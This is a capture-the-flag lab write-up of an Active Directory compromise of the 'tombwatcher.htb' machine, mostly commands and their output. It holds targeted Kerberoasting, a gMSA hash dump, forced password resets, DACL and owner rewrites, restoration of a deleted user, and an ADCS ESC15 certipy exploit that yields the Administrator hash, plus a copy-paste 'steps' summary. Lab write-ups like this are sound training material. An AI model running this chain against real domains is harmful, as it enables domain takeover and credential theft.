## Nutshell
- Some ACL stuff.
- restore deleted user that can request a vulnerable `ESC15` certificate. 
---

IP: 10.10.11.72
Start with credentials `henry` / `H3nry_987TGV!`

Start with the nmap:
```
PORT     STATE SERVICE       REASON          VERSION                                                                                                                                               
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0              
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-24 11:07:01Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)


```

Using Bloodhound we can see our attack path:
![[Z Assets/Images/Pasted image 20250926012245.jpeg]]
we used this command to get the hash of `alfred`:
```
targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

I got the alfred hash, and cracked it. The password is:
`alfred`:`basketball`

---

We will at the outbound object control of `alfred`:
![[Z Assets/Images/Pasted image 20250926012634.jpeg]]
```
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember 'infrastructure' 'alfred'
```

This group has `ReadGMSAPassword` on `Ansible_DEV` machine, So we can read its NTLM hash:
![[Z Assets/Images/Pasted image 20250926014916.jpeg]]
```
gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d

```

This machine has `ForceChangePassword` on `sam` user:
![[Z Assets/Images/Pasted image 20250926021337.jpeg]]
```
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u 'ANSIBLE_DEV$' -p ':4f46405647993c7d4e1dc1c25dd6ecf4' set password "sam" 'basketball'
```

Now, `sam` has `WriteOwner` on `john`:
![[Z Assets/Images/Pasted image 20250926022429.jpeg]]
First, we change from `WriteOwner` to `GenericAll`, then start to exploit as we want: 
```
owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'basketball' -k
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'basketball' -k
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u 'sam' -p 'basketball' set password "john" 'basketball'
```

Now, john is joind to `Remote management group`:

![[Z Assets/Images/Pasted image 20250926024847.jpeg]]
And he has `GenericAll` on `ADCS`.

![[Z Assets/Images/Pasted image 20250926025009.jpeg]]

we can do evil-winrm to get the `flag.txt`

---

After doing `win-rm`, we found  deleted users with name `cert_admin` but it is within 3 objects.
```
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

Deleted           : True             
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb    
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319 

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb     
Name              : cert_admin                                                                              
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3  

Deleted           : True     
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb     
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358  

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Resotre objects:
```
Restore-ADObject -Identity "CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```

Looking at bloodhound, we have `GenericAll` on `cert_admin` user, And this user can enroll to certificate that is vulnerable.
![[Z Assets/Images/Pasted image 20250926151132.jpeg]]

![[Z Assets/Images/Pasted image 20250926151222.jpeg]]
```
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

We will exploit `ESC15` now:
```
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'basketball' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'

certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'basketball' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER.HTB\Administrator'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
```

Then we got TGT ticket and the hash of administrator:
```
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:2f071c9718cb504323fc71e083cab2b8
```
GG


---

```steps
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember 'infrastructure' 'alfred'
gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'

bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u 'ANSIBLE_DEV$' -p ':4f46405647993c7d4e1dc1c25dd6ecf4' set password "sam" 'basketball'
owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'basketball' -k
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'basketball' -k
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u 'sam' -p 'basketball' set password "john" 'basketball'

Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"

bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u 'john' -p 'basketball' set password "cert_admin" 'basketball'

certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'basketball' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'

certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'basketball' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER.HTB\Administrator'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'


```



```collecting

bloodhound-ce-python -d tombwatcher.htb  -dc dc01.tombwatcher.htb -u 'john@tombwatcher.htb' -p 'basketball' -ns 10.10.11.72 --collection All --zip
rusthound-ce -u 'john' -p 'basketball' -d tombwatcher.htb -f dc01.tombwatcher.htb

```

pre2k